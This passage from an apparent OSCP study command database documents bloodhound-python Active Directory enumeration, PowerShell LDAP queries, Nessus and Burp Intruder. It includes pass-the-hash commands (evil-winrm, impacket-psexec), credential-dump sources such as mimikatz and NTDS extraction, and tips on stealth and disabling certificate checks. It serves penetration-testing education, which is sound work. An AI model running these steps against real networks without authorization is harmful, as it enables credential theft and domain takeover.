- You have credentials but no Windows shell
- SharpHound blocked by AV/EDR
- Prefer to work from Kali
- Pass-the-hash scenario (use --hashes)

WHEN TO USE SHARPHOUND INSTEAD:
- You have Windows shell access
- Need local admin session data (LoggedOn collection)
- Large domain (SharpHound faster)
- Need most complete data

COMPLETE WORKFLOW:
1. Verify credentials work:
   crackmapexec smb <DC_IP> -u <USER> -p <PASS>
   
2. Run bloodhound-python:
   bloodhound-python -u '<USER>' -p '<PASS>' -d <DOMAIN> -ns <DC_IP> -c All --zip
   
3. Verify output:
   ls -la *bloodhound.zip
   unzip -l *bloodhound.zip  # Should contain: computers.json, users.json, groups.json, etc.
   
4. Upload to BloodHound GUI:
   - Start Neo4j: sudo neo4j console
   - Start BloodHound: bloodhound
   - Click 'Upload Data'  select ZIP
   
5. Analyze paths:
   - Search compromised user  Mark as Owned
   - Run 'Shortest Paths to Domain Admins from Owned Principals'

DATA COLLECTED (-c All):
- users.json: All domain users with properties (admincount, pwdlastset, SPN, description)
- groups.json: All groups with memberships
- computers.json: All computers with OS, delegation settings
- domains.json: Domain trusts and properties
- gpos.json: Group Policy Objects
- ous.json: Organizational Units
- containers.json: AD containers

DATA LIMITATIONS vs SharpHound:
- No LSASS session data (LoggedOn)
- Limited local admin enumeration (requires SMB access)
- No scheduled task/service enumeration (Experimental in SharpHound)

OUTPUT FILES:
- Default: Individual JSON files in current directory
- With --zip: Single YYYYMMDDHHMMSS_bloodhound.zip
- Custom prefix: -op custom_ creates custom_*.json

EXAM TIP: Always use --zip and verify ZIP contents before uploading. Corrupted or empty JSONs will cause BloodHound import failures.","high","","","","{""Could not resolve domain"": ""DNS resolution failed. Causes: (1) Kali DNS can't resolve internal domain, (2) Wrong domain name. SOLUTION: Add DC as nameserver: -ns <DC_IP>. Verify domain: nslookup <DOMAIN> <DC_IP>. If still failing, check domain spelling and try: bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -dc <DC_HOSTNAME>."", ""Failed to authenticate / KDC_ERR_PREAUTH_FAILED"": ""Invalid credentials. SOLUTION: Verify credentials work: crackmapexec smb <DC_IP> -u <USER> -p <PASS>. Check username format (try user@domain.com vs just user). Password special characters may need quotes: -p 'P@ss!'."", ""Could not connect to LDAP"": ""LDAP port blocked or DC hostname unresolved. SOLUTION: Test connectivity: nc -zv <DC_IP> 389. If blocked, try LDAPS: --use-ldaps (port 636). If hostname issue, use -dc to specify DC explicitly."", ""Connection reset / timeout"": ""Network issues or firewall blocking. SOLUTION: Verify LDAP port open: nmap -p 389,636,445 <DC_IP>. Try fewer workers: -w 5. Use TCP for DNS: --dns-tcp. Increase DNS timeout: --dns-timeout 10."", ""No sessions collected"": ""Sessions require SMB enumeration which may need local admin. NOTE: bloodhound-python collects fewer sessions than SharpHound (can't access LSASS). Session data from bloodhound-python is limited to NetSessionEnum - less complete than SharpHound running ON target."", ""SSL certificate errors"": ""LDAPS certificate validation failed. SOLUTION: Python SSL verification issue. Try without LDAPS first. If LDAPS required (channel binding), may need to trust DC certificate or disable verification (not recommended for prod, fine for OSCP labs).""}","{""-u / --username"": ""Domain username for authentication. Supports formats: 'username' (uses -d domain), 'username@domain.com' (explicit domain), 'DOMAIN\\username' (NetBIOS). WHY REQUIRED: AD requires authentication for most queries. Anonymous LDAP rarely enabled. OSCP TIP: Use any compromised domain user - even low-privilege accounts can enumerate AD."", ""-p / --password"": ""Password for the specified user. Use quotes if password contains special characters: -p 'P@$$w0rd!'. WHY PLAINTEXT: Bloodhound-python uses password to authenticate via NTLM or request Kerberos TGT. ALTERNATIVE: Use --hashes for pass-the-hash or -k for Kerberos ccache."", ""-d / --domain"": ""Active Directory domain name (FQDN like corp.com). WHY REQUIRED: Identifies target AD environment. Used for DNS lookups, LDAP base DN calculation, and Kerberos realm. TROUBLESHOOTING: If DNS fails, use -ns to specify DC as nameserver."", ""-ns / --nameserver"": ""Alternative DNS server for domain queries (typically the DC IP). WHY CRITICAL: Bloodhound-python resolves DC hostname via DNS. Kali's default DNS likely can't resolve internal AD names. Solution: Use DC IP as nameserver. EXAMPLE: -ns 192.168.50.70 tells bloodhound-python to query DC for DNS resolution."", ""-c / --collectionmethod"": ""Specify which data to collect. 'All' collects: Group (memberships), LocalAdmin (local admin rights), Session (logged-on sessions), Trusts (domain trusts), DCOM, RDP, PSRemote, Container, ObjectProps, ACL. EXCLUDES: LoggedOn (requires local admin). WHY ALL: Comprehensive data enables BloodHound to find all possible attack paths. Use 'DCOnly' for stealth."", ""--zip"": ""Compress output JSON files into single ZIP archive. WHY USE: BloodHound GUI accepts ZIP directly - one-click upload vs selecting 8+ JSON files. Creates timestamped file: YYYYMMDDHHMMSS_bloodhound.zip. OSCP TIP: Always use --zip for cleaner workflow.""}","","[""ldapsearch-users-ad""]","[""bloodhound-upload-data"", ""bloodhound-analyze-paths"", ""impacket-getuserspns-kerberoast"", ""impacket-getnpusers-asreproast""]"
"bloodhound-python-dconly","BloodHound.py - DC-Only Stealthy Collection","enumeration","bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c DCOnly --zip","Collect Active Directory data using only Domain Controller queries (no SMB connections to member computers). Stealthier than full collection but misses local admin and session data.","active-directory","bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 -c DCOnly --zip","OSCP METHODOLOGY: Use DCOnly for initial stealthy recon, then -c All if more data needed.

TIME ESTIMATE: 10-30 seconds (much faster than -c All).

WHEN TO USE:
- Initial recon before full enumeration
- Network segmentation blocks SMB to workstations
- Concerned about EDR detection on workstation SMB queries
- Only need user/group/ACL data (no sessions)

WHAT'S COLLECTED (DCOnly):
- Group: All group memberships
- Trusts: Domain trust relationships
- ACL: Object permissions (GenericAll, WriteDacl, etc.)
- ObjectProps: User/computer properties (admincount, SPN, delegation)
- Container: GPOs, OUs, Containers

WHAT'S MISSING (DCOnly):
- LocalAdmin: Which users are local admins on which computers
- Session: Which users are logged into which computers
- DCOM/RDP/PSRemote: Remote access permissions

ATTACK PATH IMPACT:
Without LocalAdmin and Session edges, BloodHound can't show:
- 'User X is local admin on Computer Y where User Z has session'
- 'AdminTo' edges between users and computers

You'll still see:
- Group membership paths (MemberOf)
- ACL abuse paths (GenericAll, ForceChangePassword)
- Kerberoastable/AS-REP roastable users
- DCSync rights

OSCP TIP: Start with DCOnly to quickly identify Kerberoastable users and ACL misconfigs. If you need session/admin paths for lateral movement, run -c All.","high","","","","{""Missing attack paths"": ""DCOnly collection doesn't include local admin or session data. If BloodHound shows fewer paths than expected, run full collection: -c All. DCOnly is for initial recon or when network restrictions prevent SMB to clients."", ""No local admin edges"": ""Expected behavior with DCOnly. LocalAdmin collection requires SMB queries to each computer. Use -c All or -c LocalAdmin for this data.""}","{""-c DCOnly"": ""Collect only from Domain Controller via LDAP. COLLECTS: Group memberships, Trusts, ACLs, ObjectProps, Container. SKIPS: LocalAdmin, Session, DCOM, RDP, PSRemote (all require SMB to member computers). WHY USE: (1) Stealthier - no SMB connections to workstations, (2) Faster - fewer network connections, (3) Works when SMB blocked to clients. TRADEOFF: Missing session and local admin data reduces attack path discovery."", ""--exclude-dcs"": ""Optional flag to skip Domain Controllers during computer enumeration. WHY USE: DCs often have additional monitoring. Reduces noise. Use with -c All when you want computer enumeration but want to avoid DC connections.""}","","[""bloodhound-python-all-collection""]","[""bloodhound-upload-data"", ""bloodhound-python-all-collection""]"
"bloodhound-python-pth","BloodHound.py - Pass-the-Hash Collection","enumeration","bloodhound-python -u '<USERNAME>' --hashes '<LM_HASH>:<NT_HASH>' -d <DOMAIN> -ns <DC_IP> -c All --zip","Collect Active Directory data using NTLM hash instead of password (Pass-the-Hash). Essential when you have credential dump but no plaintext passwords.","active-directory","bloodhound-python -u 'pete' --hashes 'aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86' -d corp.com -ns 192.168.50.70 -c All --zip","OSCP METHODOLOGY: Pass-the-Hash is FUNDAMENTAL technique. bloodhound-python fully supports PTH for AD enumeration.

TIME ESTIMATE: Same as password auth (30s-5min).

HASH SOURCES (OSCP scenarios):
- Mimikatz: sekurlsa::logonpasswords  NTLM hash
- SAM dump: secretsdump.py LOCAL  SAM hashes
- NTDS.dit: secretsdump.py -ntds  All domain hashes
- Cached creds: mimikatz lsadump::cache  DCC2 (need crack first)
- Responder: NTLM relay captures  NetNTLMv2 (need crack first)

HASH FORMAT:
- LM:NT format required
- LM hash usually empty: aad3b435b51404eeaad3b435b51404ee
- NT hash is 32 hex characters
- Example: aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86

VERIFY HASH BEFORE USE:
crackmapexec smb <DC_IP> -u <USER> -H '<NT_HASH>'

If CME shows [+] (Pwn3d!), hash is valid and user has admin rights.
If CME shows [+] without Pwn3d, hash valid but user is not admin.
If CME shows [-], hash is invalid or expired.

COMBINE WITH OTHER PTH TOOLS:
After bloodhound-python reveals attack path, use PTH for exploitation:
- Evil-WinRM: evil-winrm -i <TARGET> -u <USER> -H <NT_HASH>
- PSExec: impacket-psexec <DOMAIN>/<USER>@<TARGET> -hashes <LM>:<NT>
- WMIExec: impacket-wmiexec <DOMAIN>/<USER>@<TARGET> -hashes <LM>:<NT>

OSCP TIP: Always try PTH when you have hashes. Even if password cracking fails, PTH may succeed.","high","","","","{""Invalid hash format"": ""Hash must be in LM:NT format with 32 hex chars each. CORRECT: 'aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86'. WRONG: 'a87f3a337d73085c45f9416be5787d86' (missing LM). If you only have NT hash, use empty LM: 'aad3b435b51404eeaad3b435b51404ee:<NT_HASH>'."", ""Authentication failed with valid hash"": ""Hash may be for wrong user or expired. Verify hash works: crackmapexec smb <DC_IP> -u <USER> -H <NT_HASH>. If CME works but bloodhound-python fails, try --auth-method ntlm to force NTLM."", ""Kerberos errors with hash"": ""Bloodhound-python may try Kerberos first. Force NTLM: --auth-method ntlm. Or use -k with Kerberos ticket instead.""}","{""--hashes"": ""NTLM hash in LM:NT format. LM hash is legacy (pre-Vista), usually empty (aad3b435b51404eeaad3b435b51404ee). NT hash is the actual password hash. FORMAT: 'aad3b435b51404eeaad3b435b51404ee:a87f3a337d73085c45f9416be5787d86'. WHY USE: Pass-the-Hash when you have hash but not plaintext password. Common after mimikatz dump, SAM extraction, or NTDS.dit extraction. OSCP CRITICAL: Master PTH - many exam scenarios give hashes, not passwords."", ""--auth-method ntlm"": ""Optional: Force NTLM authentication (skip Kerberos). Use if Kerberos auth fails with hashes. Default is 'auto' which tries Kerberos first, falls back to NTLM.""}","[""mimikatz-sekurlsa-logonpasswords""]","[""bloodhound-python-all-collection"", ""bloodhound-python-kerberos""]","[""bloodhound-upload-data"", ""evil-winrm-pth"", ""impacket-psexec-pth""]"
"bloodhound-python-kerberos","BloodHound.py - Kerberos Ticket Collection","enumeration","bloodhound-python -k -d <DOMAIN> -ns <DC_IP> -c All --zip -no-pass","Collect Active Directory data using existing Kerberos ticket (ccache file) instead of password. Useful after Kerberos ticket extraction or when password/hash unavailable.","active-directory","bloodhound-python -k -d corp.com -ns 192.168.50.70 -c All --zip -no-pass","OSCP METHODOLOGY: Kerberos authentication is stealthier than NTLM and required for some attacks.

TIME ESTIMATE: Same as password auth, plus ticket acquisition.

WORKFLOW:
1. Request TGT (if you have password):
   impacket-getTGT corp.com/pete:'Password123!' -dc-ip 192.168.50.70
   
2. Set ccache:
   export KRB5CCNAME=pete.ccache
   
3. Verify ticket:
   klist
   
4. Run bloodhound-python:
   bloodhound-python -k -d corp.com -ns 192.168.50.70 -c All --zip -no-pass

TICKET SOURCES:
- impacket-getTGT: Request with password or hash
- Rubeus: Extract from Windows memory (ticket.kirbi  convert to ccache)
- mimikatz: kerberos::list /export (ticket.kirbi  convert)
- ticketConverter.py: Convert .kirbi to .ccache

CONVERTING KIRBI TO CCACHE:
impacket-ticketConverter ticket.kirbi ticket.ccache

TIME SYNC CRITICAL:
Kerberos requires time sync within 5 minutes. Before using -k:
sudo ntpdate <DC_IP>

WHY KERBEROS OVER NTLM:
- Stealthier (Kerberos is expected AD traffic)
- Required for certain attacks (delegation abuse)
- May bypass NTLM restrictions (EPA, channel binding)

OSCP TIP: If password known, use password auth (simpler). Kerberos auth mainly needed for Pass-the-Ticket scenarios or when NTLM blocked.","medium","","","","{""No valid Kerberos ticket found"": ""Ccache file not found or empty. SOLUTION: Set KRB5CCNAME: export KRB5CCNAME=/path/to/ticket.ccache. Verify ticket exists: klist -c /path/to/ticket.ccache. Obtain ticket: impacket-getTGT <DOMAIN>/<USER>:<PASS>"", ""KRB_AP_ERR_TKT_EXPIRED"": ""Ticket has expired (default 10 hours). SOLUTION: Request new ticket: impacket-getTGT <DOMAIN>/<USER>:<PASS>. Note ticket lifetime in output."", ""KRB_AP_ERR_SKEW"": ""Time difference between Kali and DC too large (>5 min). SOLUTION: Sync time: sudo ntpdate <DC_IP> or timedatectl set-ntp true. Kerberos requires <5 minute time skew.""}","{""-k / --kerberos"": ""Use Kerberos ccache file for authentication. Reads from KRB5CCNAME environment variable or default location (/tmp/krb5cc_*). WHY USE: (1) After obtaining ticket via impacket-getTGT, (2) After extracting ticket from compromised system, (3) Pass-the-Ticket attacks. Requires valid TGT in ccache."", ""-no-pass"": ""Don't prompt for password. Use with -k when authenticating via ccache. Required because -u not specified (username comes from ticket)."", ""KRB5CCNAME"": ""Environment variable specifying ccache file path. Set before running: export KRB5CCNAME=/path/to/ticket.ccache. If not set, bloodhound-python checks default locations.""}","","[""bloodhound-python-all-collection"", ""bloodhound-python-pth""]","[""bloodhound-upload-data""]"
"bloodhound-python-specific-collection","BloodHound.py - Targeted Collection Methods","enumeration","bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c <METHODS> --zip","Run bloodhound-python with specific collection methods instead of All. Enables targeted data collection for speed or stealth.","active-directory","bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 -c Group,ACL,ObjectProps --zip","OSCP METHODOLOGY: Targeted collection for specific attack vectors.

COLLECTION METHOD GUIDE:

**MINIMUM VIABLE (Fast, Stealthy):**
-c Group,ObjectProps,Trusts
- Gets: Memberships, Kerberoastable users, AS-REP roastable, trusts
- Misses: Local admin paths, session paths, ACL abuse
- Time: ~10-30 seconds
- Use when: Quick initial recon, stealth critical

**KERBEROASTING FOCUS:**
-c ObjectProps
- Gets: SPNs for Kerberoastable users, password ages
- Misses: Most attack paths
- Time: ~10 seconds
- Use when: Only need Kerberoasting targets

**ACL ABUSE FOCUS:**
-c Group,ACL,ObjectProps
- Gets: Group memberships, ACL edges, object properties
- Misses: Session/local admin data
- Time: ~1-2 minutes
- Use when: Looking for ACL misconfigurations

**LATERAL MOVEMENT FOCUS:**
-c Session,LocalAdmin,RDP,PSRemote
- Gets: All remote access edges
- Misses: Group/ACL data
- Time: ~3-10 minutes (queries all computers)
- Use when: Planning lateral movement

**FULL COLLECTION (Default recommendation):**
-c All
- Gets: Everything except LoggedOn
- Time: 1-5 minutes
- Use when: Comprehensive enumeration

**EVERYTHING INCLUDING LOGGEDON:**
-c All,LoggedOn
- Gets: Complete data including privileged sessions
- Requires: Local admin on target computers
- Time: 5-15 minutes
- Use when: You have admin access and need complete session data

OSCP TIP: Start with -c DCOnly for quick wins (Kerberoasting, ACL), then -c All for full paths.","medium","","","","{""Access denied on computer methods"": ""LocalAdmin, Session, DCOM, RDP, PSRemote require SMB access to computers. If access denied: (1) Try DCOnly methods instead, (2) Check if SMB (445) open to targets, (3) Some methods need local admin (LoggedOn)."", ""Slow collection"": ""Computer-based methods (LocalAdmin, Session) query each computer individually. Reduce scope: --computerfile targets.txt to limit to specific computers. Increase workers: -w 20 for faster parallel queries.""}","{""Group"": ""Collect group memberships. LDAP query for all groups and their members. Enables 'MemberOf' edges in BloodHound. REQUIRED for group-based privilege escalation paths. STEALTH: Low (normal LDAP)."", ""LocalAdmin"": ""Enumerate local administrators on computers via SMB. Creates 'AdminTo' edges. REQUIRED for lateral movement paths. STEALTH: Medium (SMB connections to each computer). TIME: Slow on large domains."", ""Session"": ""Enumerate logged-on sessions via NetSessionEnum SMB call. Creates 'HasSession' edges. CRITICAL for credential theft paths (users with sessions have creds in memory). STEALTH: Medium. LIMITATION: Less complete than SharpHound."", ""Trusts"": ""Enumerate domain trusts. Creates trust edges between domains. REQUIRED for multi-domain environments. STEALTH: Low (LDAP query). TIME: Fast."", ""ACL"": ""Collect Access Control Lists on AD objects. Creates permission edges (GenericAll, WriteDacl, ForceChangePassword). CRITICAL for ACL abuse paths. STEALTH: Low (LDAP). TIME: Medium (many objects)."", ""ObjectProps"": ""Collect object properties (admincount, SPN, delegation settings, password age). Enables filtering by properties. REQUIRED for Kerberoasting (needs SPN) and AS-REP roasting (needs DONT_REQ_PREAUTH). STEALTH: Low."", ""Container"": ""Collect GPOs, OUs, and Containers. Shows GPO links and OU structure. Useful for GPO abuse paths. STEALTH: Low. TIME: Fast."", ""DCOM"": ""Enumerate Distributed COM permissions. Creates 'ExecuteDCOM' edges. Lateral movement via DCOM. STEALTH: Medium. TIME: Slow."", ""RDP"": ""Enumerate Remote Desktop Users. Creates 'CanRDP' edges. STEALTH: Medium. TIME: Slow."", ""PSRemote"": ""Enumerate PowerShell Remoting permissions. Creates 'CanPSRemote' edges. STEALTH: Medium. TIME: Slow."", ""LoggedOn"": ""Privileged session enumeration via remote registry. REQUIRES local admin on target computers. More accurate than Session but noisier. Default: EXCLUDED from 'All'.""}","","[""bloodhound-python-all-collection"", ""bloodhound-python-dconly""]","[""bloodhound-upload-data""]"
"bloodhound-python-ldaps","BloodHound.py - LDAPS Encrypted Collection","enumeration","bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> --use-ldaps -c All --zip","Collect AD data over LDAPS (LDAP over TLS/SSL on port 636). Required when LDAP signing or channel binding is enforced.","active-directory","bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 --use-ldaps -c All --zip","OSCP METHODOLOGY: Most exam environments use plain LDAP. LDAPS needed only in hardened environments.

WHEN LDAPS REQUIRED:
- 'LDAP signing required' Group Policy enabled
- 'LDAP channel binding' enforced (recent Windows updates)
- Network IDS blocks plain LDAP
- Compliance requirements

DETECTING LDAPS REQUIREMENT:
Plain LDAP fails with: 'data 52e' (invalid creds format) or 'Strong auth required'

VERIFY LDAPS AVAILABLE:
nmap -p 636 -sV <DC_IP>
openssl s_client -connect <DC_IP>:636

CERTIFICATE ERRORS:
OSCP lab DCs may have self-signed certs. Quick bypass:
export LDAPTLS_REQCERT=never
export PYTHONHTTPSVERIFY=0

Then run bloodhound-python --use-ldaps

OSCP TIP: Try plain LDAP first. Only use --use-ldaps if plain fails with signing/binding errors.","low","","","","{""SSL CERTIFICATE_VERIFY_FAILED"": ""Python SSL certificate validation failed. Causes: (1) Self-signed DC certificate, (2) CA not trusted. SOLUTIONS: In OSCP labs, this is expected. Workaround: Set environment variable before running: export PYTHONHTTPSVERIFY=0 (disables verification). Not recommended for production."", ""data 80090346 (channel binding)"": ""LDAP channel binding enforced but not provided. SOLUTION: Use --ldap-channel-binding flag. This requires LDAPS automatically."", ""Connection refused on 636"": ""LDAPS not enabled on DC. Verify: nmap -p 636 <DC_IP>. If closed, use plain LDAP (port 389) without --use-ldaps."", ""Timeout on LDAPS"": ""TLS handshake issue. May be firewall or certificate problem. Try: openssl s_client -connect <DC_IP>:636 to debug TLS.""}","{""--use-ldaps"": ""Use LDAP over TLS (port 636) instead of plain LDAP (389). WHY NEEDED: (1) LDAP signing required (Group Policy 'Domain controller: LDAP server signing requirements'), (2) LDAP channel binding enforced (modern Windows security), (3) Network inspection blocks plain LDAP. OSCP NOTE: Most exam environments allow plain LDAP, but LDAPS may be required in hardened scenarios."", ""--ldap-channel-binding"": ""Enable LDAP channel binding. Automatically enables LDAPS. WHY NEEDED: Windows security feature binding TLS channel to LDAP bind. If you see 'data 80090346' errors, this is channel binding rejection. Use this flag to comply.""}","","[""bloodhound-python-all-collection""]","[""bloodhound-upload-data""]"
"bloodhound-python-computerfile","BloodHound.py - Targeted Computer Enumeration","enumeration","bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c Session,LocalAdmin --computerfile <COMPUTER_FILE> --zip","Limit computer-based enumeration (Session, LocalAdmin) to specific computers listed in a file. Faster and stealthier than querying all domain computers.","active-directory","bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 -c Session,LocalAdmin --computerfile targets.txt --zip","OSCP METHODOLOGY: Use computerfile to target high-value systems identified during recon.

WORKFLOW:
1. Identify high-value targets from initial DCOnly collection:
   - Domain Controllers
   - Servers with 'admin' or 'sql' in name
   - Computers with unconstrained delegation
   
2. Create target file:
   echo 'dc01.corp.com' > targets.txt
   echo 'sql01.corp.com' >> targets.txt
   echo 'admin-ws.corp.com' >> targets.txt
   
3. Run targeted collection:
   bloodhound-python -u user -p pass -d corp.com -ns <DC> \
     -c Session,LocalAdmin --computerfile targets.txt --zip

FILE FORMAT:
One FQDN per line, no quotes:
dc01.corp.com
client01.corp.com
server02.corp.com

GENERATING COMPUTER LIST:
From BloodHound Cypher query:
MATCH (c:Computer) WHERE c.unconstraineddelegation = true RETURN c.name

From ldapsearch:
ldapsearch -x -H ldap://<DC> -D user@domain -w pass -b 'DC=corp,DC=com' \
  '(objectClass=computer)' dNSHostName | grep dNSHostName | awk '{print $2}'

OSCP TIP: In time-limited exams, target DCs and a few workstations rather than enumerating all computers.","medium","","","","{""Computer not found"": ""Computer FQDN in file doesn't resolve. Verify: nslookup dc01.corp.com <DC_IP>. File must contain FQDNs (dc01.corp.com), not hostnames (dc01) or IPs."", ""Permission denied reading file"": ""Check file permissions. File must be readable by current user.""}","{""--computerfile"": ""Path to file containing computer FQDNs (one per line). Only these computers will be queried for Session, LocalAdmin, DCOM, RDP, PSRemote methods. FILE FORMAT: dc01.corp.com\\nclient01.corp.com\\nserver02.corp.com. WHY USE: (1) Large domains with 1000+ computers - full enum takes forever, (2) Target specific high-value systems, (3) Reduce network noise, (4) Scope limited engagement."", ""-w / --workers"": ""Number of parallel worker threads for computer enumeration (default: 10). Increase for faster collection: -w 20. Decrease if causing network issues: -w 5. Each worker queries one computer at a time.""}","[""bloodhound-python-dconly""]","[""bloodhound-python-all-collection""]","[""bloodhound-upload-data""]"
"bloodhound-python-output-prefix","BloodHound.py - Custom Output Naming","enumeration","bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d <DOMAIN> -ns <DC_IP> -c All -op <PREFIX> --zip","Customize output file naming with prefix. Useful for organizing data from multiple domains or collection runs.","active-directory","bloodhound-python -u 'pete' -p 'Password123!' -d corp.com -ns 192.168.50.70 -c All -op corp_exam --zip","OSCP METHODOLOGY: Keep outputs organized for multi-machine exams.

NAMING CONVENTION:
-op oscp_machine1   oscp_machine1_YYYYMMDDHHMMSS_bloodhound.zip
-op corp_initial    corp_initial_YYYYMMDDHHMMSS_bloodhound.zip
-op after_creds     after_creds_YYYYMMDDHHMMSS_bloodhound.zip

OSCP EXAM ORGANIZATION:
mkdir -p ~/oscp_exam/{ad_set1,ad_set2}
cd ~/oscp_exam/ad_set1
bloodhound-python ... -op ad_set1 --zip

This creates ad_set1_*_bloodhound.zip in the ad_set1 directory.","low","","","","","{""-op / --outputprefix"": ""Prepend string to output filenames. DEFAULT OUTPUT: YYYYMMDDHHMMSS_bloodhound.zip. WITH PREFIX: <PREFIX>_YYYYMMDDHHMMSS_bloodhound.zip. WHY USE: (1) Organize multi-domain collections, (2) Track exam machine outputs, (3) Prevent accidental overwrites.""}","","","[""bloodhound-upload-data""]"
"ps-ldap-directorysearcher","PowerShell .NET DirectorySearcher LDAP Query","enumeration","([adsisearcher]'<LDAP_FILTER>').FindAll()","Perform LDAP queries against Active Directory using built-in .NET DirectorySearcher class without importing tools","ACTIVE_DIRECTORY","([adsisearcher]'(objectClass=user)').FindAll()","","","[{""command"": ""([adsisearcher]'(objectClass=user)').FindAll()"", ""description"": ""Enumerate all user objects in Active Directory domain"", ""context"": ""Basic AD user enumeration""}, {""command"": ""([adsisearcher]'(objectClass=group)').FindAll() | ForEach-Object { $_.Properties.name }"", ""description"": ""List all AD group names (extracts 'name' property from results)"", ""context"": ""AD group discovery""}, {""command"": ""([adsisearcher]'(samaccountname=Administrator)').FindOne().Properties"", ""description"": ""Get detailed properties for Administrator account (FindOne returns single result)"", ""context"": ""Target-specific user enumeration""}, {""command"": ""([adsisearcher]'(&(objectClass=user)(adminCount=1))').FindAll() | ForEach-Object { $_.Properties.samaccountname }"", ""description"": ""Find privileged users (adminCount=1 indicates protected admin accounts)"", ""context"": ""High-value target identification""}, {""command"": ""([adsisearcher]'(&(objectClass=computer)(operatingSystem=*Server*))').FindAll() | ForEach-Object { $_.Properties.dnshostname }"", ""description"": ""Enumerate all server computers in domain by operating system filter"", ""context"": ""Server discovery for lateral movement""}]","{""purpose"": ""Query Active Directory via LDAP using PowerShell's built-in [adsisearcher] type accelerator - no PowerView or external tools required"", ""manual_alternative"": ""Import PowerView: Import-Module .\\PowerView.ps1; Get-DomainUser (requires file transfer and AV evasion)"", ""common_failures"": [""Not domain-joined or no domain context - [adsisearcher] requires domain authentication"", ""Complex LDAP filters require proper syntax: (&(condition1)(condition2)) for AND, (|(c1)(c2)) for OR"", ""FindAll() returns System.DirectoryServices.SearchResult - access .Properties for actual data"", ""Forgetting to extract properties - results are objects, not plain strings""], ""when_to_use"": [""Initial AD enumeration from compromised domain-joined Windows host"", ""When PowerView/SharpHound uploads trigger AV alerts"", ""Quick queries without importing tools (stealth)"", ""OSCP exam scenarios requiring AD enumeration without tool transfers""], ""exam_relevance"": ""HIGH - Built-in method works on any domain-joined Windows host without tool uploads. Critical for OSCP AD enumeration."", ""time_estimate"": ""5-30 seconds depending on domain size"", ""technical_notes"": [""[adsisearcher] is PowerShell type accelerator for System.DirectoryServices.DirectorySearcher"", ""Automatically binds to current user's domain context"", ""LDAP filters use standard RFC 4515 syntax"", ""FindAll() returns all matches, FindOne() returns first match only"", ""Results include .Properties (hashtable) and .Path (LDAP distinguished name)""]}","[""ps-get-current-domain"", ""ps-nested-group-check-member-type"", ""powerview-get-domainuser""]","","","[""ps-get-current-domain""]","[""ldapsearch-users-ad"", ""get-netuser""]","[""kerbrute-userenum-ad"", ""impacket-getnpusers-asreproast""]"
"nessus-scan","Nessus Vulnerability Scan","enumeration","N/A - GUI-based tool","Professional vulnerability scanner with comprehensive vulnerability database","","","Nessus is a GUI-based vulnerability scanner not available in OSCP exam environment.

MANUAL STEPS (Professional Version):
1.

Open Nessus web interface (https://localhost:8834)
2.

Login with credentials
3.

Click 'New Scan'  Select scan template:
   - Basic Network Scan:
Standard host discovery and port scanning
   - Advanced Scan:
Full vulnerability assessment with authenticated checks
   - Web Application Tests:
Web-specific vulnerability detection
4.

Configure scan:
   - Name:
Descriptive name (e.g., 'Target-192.168.45.100')
   - Targets:
IP address or range (192.168.45.100 or 192.168.45.0/24)
   - Discovery:
Set port range (default:
1-65535, consider focused scans)
5.

Launch scan and monitor progress
6.

Review results:
   - Critical/High findings first
   - Check for exploitable vulnerabilities
   - Verify findings manually (false positives common)
7.

Export report (HTML/PDF) for documentation

CLI ALTERNATIVE (Nessus Professional with CLI):
/opt/nessus/bin/nessuscli scan --new --name=""<SCAN_NAME>"" --targets=""<TARGET>"" --template=""basic""

OSCP EXAM NOTES:
- Nessus NOT available in exam environment
- GUI tools not permitted during exam
- Use alternative CLI scanners instead

RECOMMENDED OSCP ALTERNATIVES:
- nmap with NSE scripts for vulnerability detection
- OpenVAS (open-source alternative, also GUI)
- Manual enumeration + searchsploit for version-specific exploits","low","","","","","","","[""nmap-vuln-scan"", ""nikto-scan"", ""whatweb-enum""]",""
"burp-intruder","Burp Suite Intruder - Automated Fuzzing","web","N/A - GUI-based tool","Automated parameter fuzzing and brute-force attacks using Burp Suite Intruder","","","Burp Suite Intruder is a GUI-based fuzzing module not available in OSCP exam.

MANUAL STEPS (Burp Suite Professional):
1.

Intercept request in Burp Proxy:
   - Configure browser proxy (127.0.0.1:8080)
   - Navigate to target page and capture request
   - Right-click request  Send to Intruder

2.

Configure attack positions:
   - Intruder tab  Positions sub-tab
   - Click 'Clear ' to remove auto-marked positions
   - Select parameter value to fuzz
   - Click 'Add ' to mark as injection point
   - Example:
username=admin&password=test

3.

Select attack type:
   - Sniper:
Single position, one payload set (parameter discovery)
   - Battering ram:
Multiple positions, same payload (password in multiple fields)
   - Pitchfork:
Multiple positions, parallel iteration (username+password pairs)
   - Cluster bomb:
Multiple positions, all combinations (full brute-force)

4.

Configure payloads:
   - Payloads tab  Payload Sets
   - Payload type:
Simple list (wordlist), Numbers (IDOR), etc.
   - Load wordlist or configure generation rules
   - Example wordlists:
     * /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
     * /usr/share/wordlists/rockyou.txt (passwords)

5.

Configure payload processing (optional):
   - Add encoding (URL-encode, Base64)
   - Add prefixes/suffixes
   - Match/replace rules

6.

Configure grep match (response analysis):
   - Options tab  Grep - Match
   - Add patterns to identify successful attempts:
     * 'Welcome'
     * 'Invalid credentials' (to identify failures)
     * HTTP status codes

7.

Start attack:
   - Click 'Start attack'
   - Monitor response lengths, status codes, grep matches
   - Sort by length/status to identify anomalies

8.

Analyze results:
   - Different response length = potential hit
   - Different status code (302 vs 200)
   - Grep match differences

OSCP EXAM NOTES:
- Burp Suite Community Edition available (Intruder heavily rate-limited)
- Professional Edition NOT available in exam
- GUI fuzzing tools not practical for exam time constraints
